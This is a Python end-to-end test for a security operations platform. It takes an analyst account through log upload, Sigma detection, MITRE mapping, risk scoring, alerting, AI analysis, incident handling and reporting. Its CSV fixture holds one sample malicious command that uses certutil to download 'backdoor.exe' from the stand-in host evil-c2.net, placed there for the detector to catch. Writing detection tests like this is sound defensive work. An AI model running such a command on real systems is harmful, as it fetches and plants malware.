"""
End-to-End Test for Part 16 & Critical Requirement:
Register/Login -> Upload Security Log -> Parse Log -> Sigma Detection -> 
MITRE Mapping -> Risk Score -> Alert -> AI Analysis -> Incident -> 
Investigation -> Containment -> Resolution -> Report -> Notification.
"""

import io
import unittest
import uuid
from fastapi.testclient import TestClient
from app.main import app


class TestCompleteSOCWorkflow(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.client = TestClient(app)

    def test_complete_soc_e2e_pipeline(self):
        # --- Stage 1: Register & Login ---
        uid = uuid.uuid4().hex[:6]
        username = f"e2e_analyst_{uid}"
        email = f"e2e_{uid}@asoc.io"
        password = "E2EPassword123!"

        reg_res = self.client.post(
            "/api/v1/auth/register",
            json={
                "username": username,
                "email": email,
                "password": password,
                "first_name": "E2E",
                "last_name": "Analyst",
                "role": "analyst",
            },
        )
        self.assertEqual(reg_res.status_code, 201, f"Registration failed: {reg_res.text}")

        login_res = self.client.post(
            "/api/v1/auth/login",
            data={"username": username, "password": password},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        self.assertEqual(login_res.status_code, 200, f"Login failed: {login_res.text}")
        token = login_res.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}

        # Verify Me
        me_res = self.client.get("/api/v1/auth/me", headers=headers)
        self.assertEqual(me_res.status_code, 200)
        self.assertEqual(me_res.json()["data"]["username"], username)

        # --- Stage 2: Upload Security Log ---
        csv_content = (
            "timestamp,hostname,username,source_ip,destination_ip,message\n"
            "2026-09-08T12:00:00Z,WIN-WORK-01,Administrator,10.0.1.5,198.51.100.99,"
            "cmd.exe /c certutil -urlcache -split -f http://evil-c2.net/backdoor.exe %TEMP%\\backdoor.exe\n"
        ).encode("utf-8")

        upload_res = self.client.post(
            "/api/v1/logs/upload",
            files={"file": ("e2e_telemetry.csv", io.BytesIO(csv_content), "text/csv")},
            data={"log_source": "endpoint"},
            headers=headers,
        )
        self.assertEqual(upload_res.status_code, 201, f"Upload failed: {upload_res.text}")
        log_id = upload_res.json()["data"]["id"]

        # --- Stage 3: Parse Log ---
        parse_res = self.client.post(f"/api/v1/logs/{log_id}/parse", headers=headers)
        self.assertEqual(parse_res.status_code, 200, f"Parse failed: {parse_res.text}")
        self.assertGreaterEqual(parse_res.json()["data"]["entries_created"], 1)

        # --- Stage 4: Sigma Detection ---
        det_run = self.client.post("/api/v1/detections/run-all", headers=headers)
        self.assertEqual(det_run.status_code, 200, f"Detection run failed: {det_run.text}")
        self.assertTrue(det_run.json()["success"])

        # Fetch detections
        dets_res = self.client.get("/api/v1/detections?limit=10", headers=headers)
        self.assertEqual(dets_res.status_code, 200)
        detections = dets_res.json()["data"]
        self.assertGreater(len(detections), 0)
        det_id = detections[0]["id"]

        # --- Stage 5: MITRE ATT&CK Mapping ---
        mitre_map_res = self.client.get(f"/api/v1/detections/{det_id}/mitre", headers=headers)
        self.assertEqual(mitre_map_res.status_code, 200, f"MITRE mapping failed: {mitre_map_res.text}")
        self.assertTrue(mitre_map_res.json()["success"])

        # --- Stage 6: Risk Score ---
        risk_res = self.client.post(f"/api/v1/risk/assess/{det_id}", headers=headers)
        self.assertEqual(risk_res.status_code, 200, f"Risk assessment failed: {risk_res.text}")
        risk_score = risk_res.json()["data"]["risk_score"]
        self.assertGreaterEqual(risk_score, 0.0)
        self.assertLessEqual(risk_score, 100.0)

        # Batch assess any others
        self.client.post("/api/v1/risk/assess-batch", headers=headers)

        # --- Stage 7: Alert Generation ---
        alert_gen_res = self.client.post("/api/v1/alerts/auto-generate", headers=headers)
        self.assertEqual(alert_gen_res.status_code, 200)

        # Fetch alerts
        alerts_list = self.client.get("/api/v1/alerts?limit=10", headers=headers)
        self.assertEqual(alerts_list.status_code, 200)
        alerts = alerts_list.json()["data"]
        self.assertGreater(len(alerts), 0)
        alert_id = alerts[0]["id"]

        # --- Stage 8: AI Threat Analysis (Detection & Alert) ---
        ai_res = self.client.post(f"/api/v1/ai/analyze/detection/{det_id}", headers=headers)
        self.assertEqual(ai_res.status_code, 200, f"AI analysis failed: {ai_res.text}")
        ai_data = ai_res.json()["data"]
        self.assertIn("threat_summary", ai_data)
        self.assertIn("attack_narrative", ai_data)
        self.assertIn("confidence", ai_data)

        # AI Alert Analysis
        ai_alert_res = self.client.post(f"/api/v1/ai/analyze/alert/{alert_id}", headers=headers)
        self.assertEqual(ai_alert_res.status_code, 200, f"AI alert analysis failed: {ai_alert_res.text}")
        ai_alert_data = ai_alert_res.json()["data"]
        self.assertIn("threat_summary", ai_alert_data)
        self.assertIn("recommended_actions", ai_alert_data)

        # --- Stage 9: Incident Correlation & Incident AI Analysis ---
        inc_corr_res = self.client.post("/api/v1/incidents/auto-correlate", headers=headers)
        self.assertEqual(inc_corr_res.status_code, 200)

        incidents_list = self.client.get("/api/v1/incidents?limit=5", headers=headers)
        self.assertEqual(incidents_list.status_code, 200)
        self.assertGreater(len(incidents_list.json()["data"]), 0)
        incident = incidents_list.json()["data"][0]
        inc_id = incident["id"]

        # Verify incident's nested alert has populated risk_score
        if incident["alerts"]:
            self.assertIsNotNone(incident["alerts"][0]["risk_score"])
            self.assertGreaterEqual(incident["alerts"][0]["risk_score"], 0.0)

        # AI Incident Analysis & Response Playbook
        ai_inc_res = self.client.post(f"/api/v1/ai/analyze/incident/{inc_id}", headers=headers)
        self.assertEqual(ai_inc_res.status_code, 200, f"AI incident analysis failed: {ai_inc_res.text}")
        ai_inc_data = ai_inc_res.json()["data"]
        self.assertIn("threat_summary", ai_inc_data)
        self.assertIn("recommended_actions", ai_inc_data)
        self.assertGreater(len(ai_inc_data["recommended_actions"]), 0)

        # --- Stage 10: Investigation & Status Transition ---
        inv_res = self.client.patch(
            f"/api/v1/incidents/{inc_id}/status",
            json={"status": "investigating"},
            headers=headers,
        )
        self.assertEqual(inv_res.status_code, 200)
        self.assertEqual(inv_res.json()["data"]["status"], "investigating")

        # --- Stage 11: Containment ---
        cont_res = self.client.patch(
            f"/api/v1/incidents/{inc_id}/status",
            json={"status": "contained"},
            headers=headers,
        )
        self.assertEqual(cont_res.status_code, 200)
        self.assertEqual(cont_res.json()["data"]["status"], "contained")

        # --- Stage 12: Resolution ---
        res_res = self.client.patch(
            f"/api/v1/incidents/{inc_id}/status",
            json={"status": "resolved"},
            headers=headers,
        )
        self.assertEqual(res_res.status_code, 200)
        self.assertEqual(res_res.json()["data"]["status"], "resolved")

        # --- Stage 13: Report Generation ---
        rep_res = self.client.post(
            "/api/v1/reports/generate",
            json={"report_name": f"E2E Audit Report {uid}", "report_type": "csv"},
            headers=headers,
        )
        self.assertEqual(rep_res.status_code, 201)
        self.assertTrue(rep_res.json()["success"])

        # --- Stage 14: Notification Verification ---
        notif_res = self.client.get("/api/v1/notifications", headers=headers)
        self.assertEqual(notif_res.status_code, 200)
        self.assertTrue(notif_res.json()["success"])


if __name__ == "__main__":
    unittest.main()
